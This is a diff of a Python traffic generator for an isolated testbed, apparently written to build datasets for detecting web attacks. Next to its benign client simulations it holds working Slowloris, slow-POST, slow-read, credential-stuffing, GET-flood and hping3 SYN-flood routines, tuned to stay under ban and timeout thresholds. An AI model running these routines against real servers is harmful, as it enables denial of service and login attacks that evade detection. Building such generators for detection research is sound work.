@@ -16,8 +16,36 @@ test_distributed_suite.py, parameterised to stay below the daemon's ban threshol
         --port 443 --duration 60 --seed 7 --params '{"per_session":[4,12]}'
     ... --role attack --family slowloris --params '{"conns":6,"header_every_s":3}'
     ... --plan   # print what it would do and exit (offline, no sending)
+    ... --source 10.0.16.7   # P3: bind every connection to this address alias of the namespace
+
+--source (docs/P3_DATASET_DESIGN.md §4.2): a P3 capture groups its entities onto one namespace per
+netem profile as address aliases, so a generator must send from its entity's own address. Without
+it the generator behaves exactly as before (the kernel picks the namespace's only address).
+
+P4 (docs/P4_SLOW_DESIGN.md §5; ml/p4_traffic.py FAMILIES): slowloris with `header_every_s` given as a range [lo, hi], and
+slowpost with `byte_every_s` given as a range, run the frozen P4 pacing from a seeded schedule (ml/p4_traffic.py
+loris_schedule, post_schedule): every connection has its own gaps, a closed connection is re-opened at once and carries
+on with its slot's schedule, and --plan prints the schedule. With a number there, they run exactly as before.
+
+--stats PATH (P4, review T-047 P-06): a generator of the P4 pacing writes what it did at its exit: the connections it opened,
+re-opened and failed to open, those that failed for a local reason (no such source address, no descriptors: not the
+server's doing), and the bytes it sent.
+
+The deadline (ml/p1_prereg_3.json generator; review T-050 T050-03, -04, -16), for every kind: a generator's end is its start + --duration.
+Every think time and pause is cut at it, so no draw moves. No new view starts after it. A view in flight may finish within DRAIN_S, so a
+healthy client's last view keeps its rows; no request starts, and no wait lasts, past the end + DRAIN_S, so a request hanging there (an
+XDP-banned address, a dead server) gets its row with its error and the rest of its view is abandoned. At the end + HARD_EXIT_S the process
+exits whatever it is doing, with code 0 and what it has written: an arm that banned it did not break it.
+
+--records PATH (L7 v2, docs/L7V2_DESIGN.md §5.1; benign plan kinds): one CSV row per request as it
+completes (eval/l7v2_harm.RECORD_COLUMNS): t_intended = t_sent (a closed-loop client has no schedule
+within a view), t_done, status, err, the route class (l7_webapp's site map), the plan's user, view and
+wave, the view's nominal start and the plan's origin, all in wall-clock seconds. eval/l7v2_harm.py
+recomputes the plan to count the views that were due and never started. Without it nothing is written.
 """
 import argparse
+import csv
+import errno
 import ipaddress
 import json
 import os
@@ -26,9 +54,12 @@ import socket
 import ssl
 import subprocess
 import sys
+import threading
 import time
 
 import l7_benign  # ml/ is the script's directory, so it is on sys.path
+import l7_bots
+import p4_traffic
 
 TESTBED_NET = ipaddress.ip_network("10.0.0.0/16")
 UAS = [
@@ -38,6 +69,71 @@ UAS = [
     "curl/8.18.0", "python-requests/2.32", "TestbedMonitor/1.0",
 ]
 EXTS = ["js", "css", "png", "woff2", "json"]
+SOURCE = None          # the entity's own address when --source is given (P3); None: the kernel's choice
+RECORDER = None        # the client-side harm records when --records is given (L7 v2); None: nothing is written
+RECORD_COLUMNS = ("t_intended", "t_sent", "t_done", "status", "err", "route_class", "user", "view", "wave",
+                  "t_nominal", "t_origin")
+DRAIN_S = 5.0          # what a view or request in flight at a generator's end may still take (ml/p1_prereg_3.json generator)
+HARD_EXIT_S = 7.0      # past its end a generator exits whatever it is doing; under eval/p4_runner.py STOP_GRACE_S
+LIVE_STATS = None      # what a generator of the P4 pacing has done so far, for a hard exit (--stats)
+
+
+class Recorder:
+    """One CSV row per request, flushed line by line, so a generator stopped at the end of a run keeps its rows."""
+
+    def __init__(self, path):
+        import l7_webapp
+        self.route_class = l7_webapp.route_class
+        self.fh = open(path, "w", buffering=1, encoding="utf-8", newline="")   # noqa: SIM115 (closed in close())
+        self.writer = csv.writer(self.fh)
+        self.writer.writerow(RECORD_COLUMNS)
+        self.lock = threading.Lock()
+        self.origin = None
+
+    def row(self, t_sent, t_done, status, err, tag):
+        path, user, view, wave, t_nominal = tag
+        out = (f"{t_sent:.6f}", f"{t_sent:.6f}", f"{t_done:.6f}", status, err,
+               self.route_class("GET", path) or "", user, view, wave, f"{t_nominal:.6f}", f"{self.origin:.6f}")
+        with self.lock:
+            self.writer.writerow(out)
+
+    def close(self):
+        self.fh.close()
+
+
+def _new_session():
+    """A requests.Session; with SOURCE set, every connection it opens is bound to SOURCE."""
+    import requests
+    sess = requests.Session()
+    if SOURCE is not None:
+        adapter = _source_adapter()
+        sess.mount("http://", adapter)
+        sess.mount("https://", adapter)
+    return sess
+
+
+def _source_adapter(**kw):
+    from requests.adapters import HTTPAdapter
+
+    class SourceAdapter(HTTPAdapter):
+        def init_poolmanager(self, connections, maxsize, block=False, **pool_kw):
+            pool_kw["source_address"] = (SOURCE, 0)
+            super().init_poolmanager(connections, maxsize, block=block, **pool_kw)
+    return SourceAdapter(**kw)
+
+
+def _one_shot(method, url, **kw):
+    """requests.request, from SOURCE when it is set."""
+    import requests
+    if SOURCE is None:
+        return requests.request(method, url, **kw)
+    with _new_session() as sess:
+        return sess.request(method, url, **kw)
+
+
+def _curl(*args):
+    """A curl argv; with SOURCE set it sends from SOURCE (--interface takes an address)."""
+    return ["curl", *(("--interface", SOURCE) if SOURCE is not None else ()), *args]
 
 
 def _paths(kind, rng):
@@ -58,9 +154,28 @@ def _deadline(duration):
     return time.time() + duration
 
 
-def _rate_sleep(rps, rng):
+def _cut(seconds, end):
+    """A think time or pause cut at the generator's end; its length is already drawn, so no stream moves."""
+    time.sleep(max(0.0, min(seconds, end - time.time())))
+
+
+def _timeout(most, end):
+    """A request's timeout: at most `most`, and no wait past the generator's end + DRAIN_S."""
+    return max(0.05, min(most, end + DRAIN_S - time.time()))
+
+
+def _rate_sleep(rps, rng, end):
     # Poisson-ish spacing around the target rate.
-    time.sleep(max(0.0, rng.expovariate(rps) if rps > 0 else 0.0))
+    _cut(max(0.0, rng.expovariate(rps) if rps > 0 else 0.0), end)
+
+
+def _run_curl(end, make_argv):
+    """curl, bounded as any request (_timeout); make_argv takes its --max-time. A curl past that is killed."""
+    limit = _timeout(10.0, end)
+    try:
+        subprocess.run(make_argv(f"{limit:.2f}"), capture_output=True, check=False, timeout=limit + 1.0)
+    except subprocess.TimeoutExpired:
+        pass
 
 
 def _base(host, port):
@@ -74,9 +189,9 @@ def benign_curl_oneshot(host, port, params, dur, rng):
     end = _deadline(dur)
     while time.time() < end:
         url = _base(host, port) + _paths(params.get("paths", "mixed"), rng)
-        subprocess.run(["curl", "-s", "-k", "-o", "/dev/null", "--max-time", "10",
-                        "-A", rng.choice(UAS), url], capture_output=True, check=False)
-        time.sleep(rng.uniform(lo, hi))
+        ua = rng.choice(UAS)
+        _run_curl(end, lambda t, _u=ua, _url=url: _curl("-s", "-k", "-o", "/dev/null", "--max-time", t, "-A", _u, _url))
+        _cut(rng.uniform(lo, hi), end)
 
 
 def benign_http2(host, port, params, dur, rng):
@@ -85,10 +200,10 @@ def benign_http2(host, port, params, dur, rng):
     end = _deadline(dur)
     while time.time() < end:
         urls = [_base(host, port) + _paths("assets", rng) for _ in range(n)]
-        subprocess.run(["curl", "-s", "-k", "--http2", "--parallel", "-o", "/dev/null",
-                        "--max-time", "10", "-A", rng.choice(UAS), *urls],
-                       capture_output=True, check=False)
-        time.sleep(rng.uniform(lo, hi))
+        ua = rng.choice(UAS)
+        _run_curl(end, lambda t, _u=ua, _urls=urls: _curl("-s", "-k", "--http2", "--parallel", "-o", "/dev/null",
+                                                          "--max-time", t, "-A", _u, *_urls))
+        _cut(rng.uniform(lo, hi), end)
 
 
 def _session_browse(sess, host, port, params, rng, end):
@@ -101,19 +216,18 @@ def _session_browse(sess, host, port, params, rng, end):
             break
         try:
             sess.get(_base(host, port) + _paths(params.get("paths", "browse"), rng),
-                     headers=headers, verify=False, timeout=10)
+                     headers=headers, verify=False, timeout=_timeout(10.0, end))
         except requests.RequestException:
             break
-        time.sleep(rng.uniform(lo, hi))
+        _cut(rng.uniform(lo, hi), end)
 
 
 def benign_keepalive(host, port, params, dur, rng):
-    import requests
     end = _deadline(dur)
     while time.time() < end:
-        with requests.Session() as sess:
+        with _new_session() as sess:
             _session_browse(sess, host, port, params, rng, end)
-        time.sleep(rng.uniform(0.5, 2.0))
+        _cut(rng.uniform(0.5, 2.0), end)
 
 
 def benign_api_poll(host, port, params, dur, rng):
@@ -121,14 +235,14 @@ def benign_api_poll(host, port, params, dur, rng):
     lo, hi = params.get("interval_s", [0.5, 1.5])
     path = params.get("path", "/api/status")
     end = _deadline(dur)
-    with requests.Session() as sess:
+    with _new_session() as sess:
         while time.time() < end:
             try:
-                sess.get(_base(host, port) + path, verify=False, timeout=10,
+                sess.get(_base(host, port) + path, verify=False, timeout=_timeout(10.0, end),
                          headers={"User-Agent": "TestbedMonitor/1.0"})
             except requests.RequestException:
                 pass
-            time.sleep(rng.uniform(lo, hi))
+            _cut(rng.uniform(lo, hi), end)
 
 
 def benign_downloader(host, port, params, dur, rng):
@@ -138,25 +252,85 @@ def benign_downloader(host, port, params, dur, rng):
     end = _deadline(dur)
     while time.time() < end:
         try:
-            requests.get(_base(host, port) + path, verify=False, timeout=30)
+            _one_shot("get", _base(host, port) + path, verify=False, timeout=_timeout(30.0, end))
         except requests.RequestException:
             pass
-        time.sleep(rng.uniform(lo, hi))
+        _cut(rng.uniform(lo, hi), end)
+
+
+class UploadDeadline(Exception):
+    """A paced upload reached its generator's deadline: `requests` lets it through, and closes the connection."""
+
+
+class PacedBody:
+    """An upload body of `n` bytes that leaves no faster than `rate` bytes/s: P4's slow_uploader, a client behind a
+    16 kbit/s link (ml/l7_benign.py upload kinds). A file-like object with a length, so `requests` sends it with a
+    Content-Length like any body of known size, and reads it a piece at a time; each read returns at most CHUNK bytes,
+    once the rate allows them. With a `deadline` (wall-clock seconds, the generator's end) a read that would have to wait
+    past it raises UploadDeadline at the deadline instead (review T-047 P-01)."""
+    CHUNK = 512
+
+    def __init__(self, n, rate, clock=time.monotonic, sleep=time.sleep, deadline=None, wall=time.time):
+        if not rate > 0:
+            raise ValueError(f"rate {rate!r}: a positive number of bytes per second")
+        self.n, self.rate, self.clock, self.sleep = int(n), float(rate), clock, sleep
+        self.deadline, self.wall = deadline, wall
+        self.sent, self.t0 = 0, None
+
+    def __len__(self):
+        return self.n
+
+    def read(self, size=-1):
+        left = self.n - self.sent
+        if left <= 0:
+            return b""
+        if self.t0 is None:
+            self.t0 = self.clock()
+        want = min(left, self.CHUNK if size is None or size < 0 else max(1, min(size, self.CHUNK)))
+        wait = self.t0 + (self.sent + want) / self.rate - self.clock()
+        if self.deadline is not None and self.wall() + max(wait, 0.0) >= self.deadline:
+            self.sleep(max(0.0, self.deadline - self.wall()))
+            raise UploadDeadline
+        if wait > 0:
+            self.sleep(wait)
+        self.sent += want
+        return b"x" * want
 
 
 def benign_uploader(host, port, params, dur, rng):
+    """Post a body to /upload, think, repeat (ml/l7_benign.upload_plan; the P5 uploader's draws). With `rate_Bps` (P4's
+    slow_uploader) the body is paced at that rate (PacedBody); everything else is the same. The generator's deadline ends
+    everything (review T-047 P-01): a body of up to 2 MB at 16 kbit/s takes up to 1,000 s, and nothing on the server ends it
+    in time. So each upload runs in a daemon thread that the generator waits for only until the deadline: a paced body stops
+    there, any other upload in flight goes with the process, and a think time is cut at the deadline too."""
     import requests
-    lo, hi = params.get("think_s", [4.0, 10.0])
-    blo, bhi = params.get("body_bytes", [200, 60000])
     path = params.get("path", "/upload")
+    rate = params.get("rate_Bps")
     end = _deadline(dur)
-    while time.time() < end:
-        body = b"x" * rng.randint(blo, bhi)
+
+    def post(body):
         try:
-            requests.post(_base(host, port) + path, data=body, verify=False, timeout=15)
-        except requests.RequestException:
+            _one_shot("post", _base(host, port) + path, data=body, verify=False, timeout=15)
+        except (requests.RequestException, UploadDeadline):
             pass
-        time.sleep(rng.uniform(lo, hi))
+
+    for size, think in l7_benign.upload_plan(params, dur, rng):
+        if time.time() >= end:
+            break
+        body = PacedBody(size, rate, deadline=end) if rate else b"x" * size
+        worker = threading.Thread(target=post, args=(body,), daemon=True)
+        worker.start()
+        worker.join(max(0.0, end - time.time()))
+        if worker.is_alive():
+            break
+        time.sleep(max(0.0, min(think, end - time.time())))
+
+
+def benign_slow_uploader(host, port, params, dur, rng):
+    """P4's slow_uploader: the uploader with its body paced at params["rate_Bps"] (docs/P4_SLOW_DESIGN.md §4.2)."""
+    if not params.get("rate_Bps"):
+        raise SystemExit("[-] slow_uploader needs params rate_Bps (bytes per second)")
+    benign_uploader(host, port, params, dur, rng)
 
 
 def benign_nat_gateway(host, port, params, dur, rng):
@@ -176,12 +350,29 @@ def benign_nat_gateway(host, port, params, dur, rng):
 #    l7_benign.plan_client() builds from this process's seed — the same plan the
 #    admissibility gate (ml/l7_admissibility.py) simulated. ──
 
-def _quiet_get(sess, url):
+def _quiet_get(sess, url, headers=None, tag=None, end=None):
+    """GET, never raising; with --records and a `tag` (path, user, view, wave, nominal start) it writes the row. With the generator's
+    `end` it sends nothing past end + DRAIN_S and waits no longer than that."""
     import requests
+    t_sent, status, err = time.time(), "nan", ""
+    if end is not None and t_sent >= end + DRAIN_S:
+        return
     try:
-        sess.get(url, verify=False, timeout=10)
+        resp = sess.get(url, verify=False, timeout=10 if end is None else _timeout(10.0, end), headers=headers)
+        status = getattr(resp, "status_code", "nan")
+    except requests.Timeout:
+        err = "timeout"
+    except requests.ConnectionError:
+        err = "conn"
     except requests.RequestException:
-        pass
+        err = "error"
+    if RECORDER is not None and tag is not None:
+        RECORDER.row(t_sent, time.time(), status, err, tag)
+
+
+def _referer(base, path):
+    """The Referer header of an L7 v2 request (docs/L7V2_DESIGN.md §8.4), or None."""
+    return {"Referer": base + path} if path else None
 
 
 def _session(ua, conns):
@@ -189,17 +380,19 @@ def _session(ua, conns):
     import requests
     from requests.adapters import HTTPAdapter
     sess = requests.Session()
-    adapter = HTTPAdapter(pool_connections=1, pool_maxsize=conns)
+    adapter = (_source_adapter(pool_connections=1, pool_maxsize=conns) if SOURCE is not None
+               else HTTPAdapter(pool_connections=1, pool_maxsize=conns))
     sess.mount("http://", adapter)
     sess.mount("https://", adapter)
     sess.headers["User-Agent"] = ua
     return sess
 
 
-def _browser_device(base, user, start, end):
+def _browser_device(base, user, start, end, uid=0):
     """Load each view's waves in order (a wave fans out over the device's connections),
     then wait the view's pause. Network time stretches the nominal timeline; it never
-    compresses it."""
+    compresses it. An L7 v2 view (with "doc") sends its first wave with Referer = its "ref"
+    and its later waves with Referer = its "doc"; the session keeps the server's cookies."""
     from concurrent.futures import ThreadPoolExecutor
     views = user["views"]
     if not views:
@@ -207,31 +400,46 @@ def _browser_device(base, user, start, end):
     time.sleep(max(0.0, min(start + views[0]["t"], end) - time.time()))
     with _session(user["ua"], l7_benign.BROWSER_CONNS) as sess, \
             ThreadPoolExecutor(l7_benign.BROWSER_CONNS) as pool:
-        for v in views:
+        for vi, v in enumerate(views):
             if time.time() >= end:
                 break
-            for wave in v["waves"]:
+            for i, wave in enumerate(v["waves"]):
+                if time.time() >= end + DRAIN_S:
+                    break
                 if wave:
-                    list(pool.map(lambda p, _s=sess: _quiet_get(_s, base + p), wave))
-            time.sleep(max(0.0, min(v["pause_s"], end - time.time())))
+                    hdrs = _referer(base, v.get("ref") if i == 0 else v.get("doc")) if "doc" in v else None
+                    list(pool.map(lambda p, _s=sess, _h=hdrs, _t=(uid, vi, i, start + v["t"]):
+                                  _quiet_get(_s, base + p, _h, (p, *_t), end), wave))
+            _cut(v["pause_s"], end)
 
 
-def _paced_user(base, user, end):
+def _paced_user(base, user, end, uid=0, start=None):
+    """Issue each request, then wait its gap; an L7 v2 item (path, gap, referer) also sends its Referer. Each request is
+    a one-request view of the records, its nominal start the sum of the gaps before it."""
+    t_nom = time.time() if start is None else start
     with _session(user["ua"], 1) as sess:
-        for path, gap in user["requests"]:
+        for vi, item in enumerate(user["requests"]):
+            path, gap = item[0], item[1]
             if time.time() >= end:
                 break
-            _quiet_get(sess, base + path)
-            time.sleep(max(0.0, min(gap, end - time.time())))
+            _quiet_get(sess, base + path, _referer(base, item[2]) if len(item) > 2 else None, (path, uid, vi, 0, t_nom), end)
+            t_nom += gap
+            _cut(gap, end)
 
 
 def _run_plan(kind, host, port, params, dur, rng):
+    _run_users(l7_benign.plan_client(kind, params, dur, rng), host, port, dur)
+
+
+def _run_users(plan, host, port, dur):
+    """Run every user of a plan in its own thread: browser devices or paced users."""
     import threading
-    plan = l7_benign.plan_client(kind, params, dur, rng)
     base, start = _base(host, port), time.time()
     end = start + dur
-    targets = [(_browser_device, (base, u, start, end)) if "views" in u
-               else (_paced_user, (base, u, end)) for u in plan["users"]]
+    if RECORDER is not None:
+        RECORDER.origin = start
+    targets = [(_browser_device, (base, u, start, end, uid)) if "views" in u
+               else (_paced_user, (base, u, end, uid, start)) for uid, u in enumerate(plan["users"])]
     threads = [threading.Thread(target=f, args=a, daemon=True) for f, a in targets]
     for t in threads:
         t.start()
@@ -255,7 +463,40 @@ def benign_crawler_polite(host, port, params, dur, rng):
     _run_plan("crawler_polite", host, port, params, dur, rng)
 
 
+def benign_tpcw_browsing(host, port, params, dur, rng):
+    _run_plan("tpcw_browsing", host, port, params, dur, rng)
+
+
+def benign_tpcw_shopping(host, port, params, dur, rng):
+    _run_plan("tpcw_shopping", host, port, params, dur, rng)
+
+
+def benign_zipf_browser(host, port, params, dur, rng):
+    _run_plan("zipf_browser", host, port, params, dur, rng)
+
+
+def benign_search_user(host, port, params, dur, rng):
+    _run_plan("search_user", host, port, params, dur, rng)
+
+
+def benign_exporter(host, port, params, dur, rng):
+    _run_plan("exporter", host, port, params, dur, rng)
+
+
+def benign_flash_crowd(host, port, params, dur, rng):
+    _run_plan("flash_crowd", host, port, params, dur, rng)
+
+
 # ───────────────────────────── attack families ─────────────────────────────
+
+def _bot(family):
+    """The generator of an L7 v2 class (ml/l7_bots.py, docs/L7V2_DESIGN.md §7.1): its seeded plan, executed by the
+    same paced-user and browser-device machinery as the benign plans."""
+    def run(host, port, params, dur, rng):
+        _run_users(l7_bots.plan_bot(family, params, dur, rng), host, port, dur)
+    run.__name__ = run.__qualname__ = "attack_" + family.replace("@", "_").lower()
+    return run
+
 
 def attack_rate_get(host, port, params, dur, rng, path_fn=None, extra_headers=None):
     """Rate-bounded GETs at params['rps'] (< the daemon's ban threshold)."""
@@ -265,15 +506,15 @@ def attack_rate_get(host, port, params, dur, rng, path_fn=None, extra_headers=No
     headers = {"User-Agent": rng.choice(UAS)}
     if extra_headers:
         headers.update(extra_headers)
-    with requests.Session() as sess:
+    with _new_session() as sess:
         while time.time() < end:
             url = _base(host, port) + (path_fn(rng) if path_fn
                                        else _paths(params.get("paths", "mixed"), rng))
             try:
-                sess.get(url, headers=headers, verify=False, timeout=10)
+                sess.get(url, headers=headers, verify=False, timeout=_timeout(10.0, end))
             except requests.RequestException:
                 pass
-            _rate_sleep(rps, rng)
+            _rate_sleep(rps, rng, end)
 
 
 def attack_subthreshold_flood(host, port, params, dur, rng):
@@ -294,67 +535,183 @@ def attack_credstuff(host, port, params, dur, rng):
     rps = params["rps"]
     path = params.get("path", "/login")
     end = _deadline(dur)
-    with requests.Session() as sess:
+    with _new_session() as sess:
         while time.time() < end:
             body = json.dumps({"u": f"user{rng.randrange(10**6)}", "p": "x" * 12}).encode()
             try:
-                sess.post(_base(host, port) + path, data=body, verify=False, timeout=10,
+                sess.post(_base(host, port) + path, data=body, verify=False, timeout=_timeout(10.0, end),
                           headers={"User-Agent": rng.choice(UAS)})
             except requests.RequestException:
                 pass
-            _rate_sleep(rps, rng)
+            _rate_sleep(rps, rng, end)
 
 
-def _open_sockets(host, port, n, send_head):
+LOCAL_ERRNOS = {errno.EADDRNOTAVAIL, errno.EADDRINUSE, errno.EMFILE, errno.ENFILE, errno.ENOBUFS, errno.ENOMEM,
+                errno.ENETUNREACH}       # an open that failed for a reason of this machine, not the server's answer
+
+
+def _open_sockets(host, port, n, send_head, errors=None, end=None):
     socks = []
     for _ in range(n):
+        if end is not None and time.time() >= end:
+            break
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(4)
+            if SOURCE is not None:
+                s.bind((SOURCE, 0))
             s.connect((host, port))
             if port == 443:
                 ctx = ssl._create_unverified_context()   # testbed self-signed cert
                 s = ctx.wrap_socket(s, server_hostname="localhost")
             s.sendall(send_head)
             socks.append(s)
-        except OSError:
-            pass
+        except OSError as exc:
+            if errors is not None:
+                errors.append(exc)
     return socks
+
+
+def paced(family, params):
+    """True for the P4 pacing of a slow family (a range of gaps, ml/p4_traffic.py), False for the earlier one."""
+    key = {"slowloris": "header_every_s", "slowpost": "byte_every_s"}.get(family)
+    return key is not None and isinstance(params.get(key), (list, tuple))
+
+
+def slow_schedule(family, host, params, dur, rng):
+    """The P4 schedule of one slow source, drawn from its seed as its generator draws it: the request head (Slowloris:
+    one head for every connection, its query and UA drawn as before), then each connection slot's events
+    (ml/p4_traffic.py loris_schedule / post_schedule). What --plan prints and what attack_slowloris / attack_slowpost
+    execute."""
+    if family == "slowloris":
+        head = (f"GET /?r={rng.randrange(10**6)} HTTP/1.1\r\nHost: {host}\r\n"
+                f"User-Agent: {rng.choice(UAS)}\r\n")
+        return {"family": family, "head": head, "slots": p4_traffic.loris_schedule(params, dur, rng)}
+    path = params.get("path", "/upload")
+    head = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
+            "Content-Type: application/octet-stream\r\nContent-Length: {n}\r\n\r\n")
+    return {"family": family, "head": head, "slots": p4_traffic.post_schedule(params, dur, rng)}
+
+
+def run_slow_schedule(host, port, sched, dur):
+    """Execute a P4 slow schedule: open every slot's connection with its head, then send each slot's events at their
+    times from the start, one thread for all. A slot whose send fails (its connection was closed) is re-opened at once,
+    as attack_slowpost re-opens, and one that could not be opened is tried again at its next event. A slow-POST
+    connection declares its slot's next Content-Length and is closed and re-opened once its body is complete. Returns
+    {"opened" (slots opened at least once), "reopened", "sent_bytes", "failed_opens", "local_errors"}."""
+    import heapq
+    post = sched["family"] == "slowpost"
+    slots = sched["slots"]
+    events = [s["chunks"] if post else s["lines"] for s in slots]
+    global LIVE_STATS
+    stats = LIVE_STATS = {"opened": 0, "reopened": 0, "sent_bytes": 0, "failed_opens": 0, "local_errors": 0}
+    conns, opens, body = [None] * len(slots), [0] * len(slots), [0] * len(slots)
+
+    def head(i):
+        if not post:
+            return sched["head"].encode()
+        lengths = slots[i]["content_lengths"]
+        return sched["head"].format(n=lengths[opens[i] % len(lengths)]).encode()
+
+    def open_slot(i):
+        errors = []
+        got = _open_sockets(host, port, 1, head(i), errors)
+        if not got:
+            stats["failed_opens"] += 1
+            stats["local_errors"] += sum(1 for e in errors if e.errno in LOCAL_ERRNOS)
+            return None
+        stats["opened" if opens[i] == 0 else "reopened"] += 1
+        opens[i] += 1
+        body[i] = 0
+        return got[0]
+
+    def close(i):
+        if conns[i] is not None:
+            conns[i].close()
+        conns[i] = None
+
+    start = time.time()
+    end = start + dur
+    for i in range(len(slots)):
+        if time.time() >= end:
+            break
+        conns[i] = open_slot(i)
+    heap = [(ev[0][0], i, 0) for i, ev in enumerate(events) if ev]
+    heapq.heapify(heap)
+    while heap:
+        t, i, k = heapq.heappop(heap)
+        if start + t >= end or time.time() >= end:     # late events stop at the end too: an unreachable server costs 4 s per open
+            break
+        time.sleep(max(0.0, start + t - time.time()))
+        if conns[i] is None:
+            conns[i] = open_slot(i)
+        if conns[i] is not None:
+            payload = events[i][k][1]
+            if post:
+                limit = slots[i]["content_lengths"][(opens[i] - 1) % len(slots[i]["content_lengths"])]
+                payload = b"x" * min(payload, limit - body[i])
+            else:
+                payload = payload.encode()
+            try:
+                conns[i].sendall(payload)
+                stats["sent_bytes"] += len(payload)
+                body[i] += len(payload)
+                if post and body[i] >= limit:          # the body is complete: re-open a fresh slow POST
+                    close(i)
+                    conns[i] = open_slot(i)
+            except OSError:
+                close(i)
+                conns[i] = open_slot(i)
+        if k + 1 < len(events[i]):
+            heapq.heappush(heap, (events[i][k + 1][0], i, k + 1))
+    for i in range(len(slots)):
+        close(i)
+    return stats
 
 
 def attack_slowloris(host, port, params, dur, rng):
     """`conns` (< ban threshold) connections, each dribbling one header line every
-    header_every_s (< the 5 s header timeout), never completing the request."""
+    header_every_s (< the 5 s header timeout), never completing the request. With P4's
+    pacing (a range of gaps) the seeded schedule of slow_schedule() runs instead."""
+    if paced("slowloris", params):
+        return run_slow_schedule(host, 80, slow_schedule("slowloris", host, params, dur, rng), dur)
     conns = params["conns"]
     every = params["header_every_s"]
     head = (f"GET /?r={rng.randrange(10**6)} HTTP/1.1\r\nHost: {host}\r\n"
             f"User-Agent: {rng.choice(UAS)}\r\n").encode()
-    socks = _open_sockets(host, 80, conns, head)       # slowloris is plaintext here
     end = _deadline(dur)
+    socks = _open_sockets(host, 80, conns, head, end=end)       # slowloris is plaintext here
     while time.time() < end and socks:
         for s in list(socks):
+            if time.time() >= end:
+                break
             try:
                 s.sendall(f"X-{rng.randrange(10**4)}: {rng.randrange(10**4)}\r\n".encode())
             except OSError:
                 socks.remove(s)
-        time.sleep(every)
+        _cut(every, end)
     for s in socks:
         s.close()
 
 
 def attack_slowpost(host, port, params, dur, rng):
     """`conns` slow-body POSTs: Content-Length <= 64 KiB (no 413), one body byte
-    every byte_every_s (< the 5 s body timeout, so no RUDY ban), looping."""
+    every byte_every_s (< the 5 s body timeout, so no RUDY ban), looping. With P4's
+    pacing (a range of gaps) the seeded schedule of slow_schedule() runs instead."""
+    if paced("slowpost", params):
+        return run_slow_schedule(host, 80, slow_schedule("slowpost", host, params, dur, rng), dur)
     conns = params["conns"]
     every = params["byte_every_s"]
     n = min(params.get("body_bytes", 60000), 65536)
     head = (f"POST /upload HTTP/1.1\r\nHost: {host}\r\n"
             f"Content-Type: application/octet-stream\r\nContent-Length: {n}\r\n\r\n").encode()
-    socks = _open_sockets(host, 80, conns, head)
-    sent = {id(s): 0 for s in socks}
     end = _deadline(dur)
+    socks = _open_sockets(host, 80, conns, head, end=end)
+    sent = {id(s): 0 for s in socks}
     while time.time() < end and socks:
         for s in list(socks):
+            if time.time() >= end:
+                break
             try:
                 s.sendall(b"x")
                 sent[id(s)] += 1
@@ -364,10 +721,10 @@ def attack_slowpost(host, port, params, dur, rng):
             except OSError:
                 socks.remove(s)
         if len(socks) < conns:
-            for s in _open_sockets(host, 80, conns - len(socks), head):
+            for s in _open_sockets(host, 80, conns - len(socks), head, end=end):
                 socks.append(s)
                 sent[id(s)] = 0
-        time.sleep(every)
+        _cut(every, end)
     for s in socks:
         s.close()
 
@@ -378,16 +735,18 @@ def attack_slowread(host, port, params, dur, rng):
     every = params["read_every_s"]
     path = params.get("path", "/download/large")
     head = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {rng.choice(UAS)}\r\n\r\n".encode()
-    socks = _open_sockets(host, 80, conns, head)
     end = _deadline(dur)
+    socks = _open_sockets(host, 80, conns, head, end=end)
     while time.time() < end and socks:
         for s in list(socks):
+            if time.time() >= end:
+                break
             try:
                 if not s.recv(256):          # advertise a tiny read rate
                     socks.remove(s)
             except OSError:
                 socks.remove(s)
-        time.sleep(every)
+        _cut(every, end)
     for s in socks:
         s.close()
 
@@ -395,10 +754,11 @@ def attack_slowread(host, port, params, dur, rng):
 def attack_volumetric_flood(host, port, params, dur, rng):
     """A short SYN flood (hping3), so benign L7 traffic is seen distorted (§5.6).
     The attacker's own L4 packets are not L7 requests; its effect is on others."""
-    proc = subprocess.Popen(["hping3", "-S", "-p", "80", "-i", "u500", host],
+    src = ["-a", SOURCE] if SOURCE is not None else []
+    proc = subprocess.Popen(["hping3", "-S", "-p", "80", "-i", "u500", *src, host],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     try:
-        time.sleep(params.get("dur_s", dur))
+        time.sleep(min(params.get("dur_s", dur), dur))
     finally:
         proc.terminate()
 
@@ -408,11 +768,16 @@ BENIGN = {"curl_oneshot": benign_curl_oneshot, "http2": benign_http2,
           "downloader": benign_downloader, "uploader": benign_uploader,
           "nat_gateway": benign_nat_gateway, "browser_page": benign_browser_page,
           "cgnat_browsers": benign_cgnat_browsers, "api_bulk": benign_api_bulk,
-          "crawler_polite": benign_crawler_polite}
+          "crawler_polite": benign_crawler_polite, "tpcw_browsing": benign_tpcw_browsing,
+          "tpcw_shopping": benign_tpcw_shopping, "zipf_browser": benign_zipf_browser,
+          "search_user": benign_search_user,
+          "exporter": benign_exporter, "flash_crowd": benign_flash_crowd,
+          "slow_uploader": benign_slow_uploader}
 ATTACK = {"subthreshold_flood": attack_subthreshold_flood, "scraper": attack_scraper,
           "padded_flood": attack_padded_flood, "credstuff": attack_credstuff,
           "slowloris": attack_slowloris, "slowpost": attack_slowpost,
-          "slowread": attack_slowread, "volumetric_flood": attack_volumetric_flood}
+          "slowread": attack_slowread, "volumetric_flood": attack_volumetric_flood,
+          **{family: _bot(family) for family in l7_bots.FAMILIES}}
 
 
 def resolve(role, name):
@@ -420,6 +785,17 @@ def resolve(role, name):
     if name not in table:
         raise SystemExit(f"[-] unknown {role} kind/family: {name} (have {sorted(table)})")
     return table[name]
+
+
+def _hard_exit(stats_path):
+    """The bound on every kind (the module doc): exit now, with code 0 and what is written. Rows are flushed line by line, and holding
+    the recorder's lock keeps a row from being cut in the middle."""
+    if RECORDER is not None:
+        RECORDER.lock.acquire(timeout=1.0)
+    if stats_path:
+        with open(stats_path, "w", encoding="utf-8") as fh:
+            json.dump(LIVE_STATS or {}, fh)
+    os._exit(0)
 
 
 def main(argv=None):
@@ -433,6 +809,9 @@ def main(argv=None):
     ap.add_argument("--seed", type=int, default=0)
     ap.add_argument("--params", default="{}", help="JSON params")
     ap.add_argument("--plan", action="store_true", help="print the plan and exit (no sending)")
+    ap.add_argument("--source", help="send from this address (an alias of the namespace; P3)")
+    ap.add_argument("--records", help="write the client-side harm records here (L7 v2; benign plan kinds)")
+    ap.add_argument("--stats", help="write what a generator of the P4 pacing did here, at its exit")
